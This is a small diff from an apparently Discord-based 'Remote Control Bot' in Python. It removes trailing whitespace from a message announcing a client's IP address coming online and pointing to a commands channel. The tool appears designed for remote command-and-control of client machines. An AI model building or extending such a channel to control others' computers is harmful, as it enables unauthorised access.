@@ -186,7 +186,7 @@ async def on_ready():
                         up2.write(tex)
                         up2.close()
 
-            des = f"""Client {ip} is now online! 
+            des = f"""Client {ip} is now online!
             Use commands in: {nextcord.utils.get(category.text_channels, name='commands').mention}"""
             embed = nextcord.Embed(title="Client online!", timestamp=datetime.now(), colour=0x00f51d, description=des)
             embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
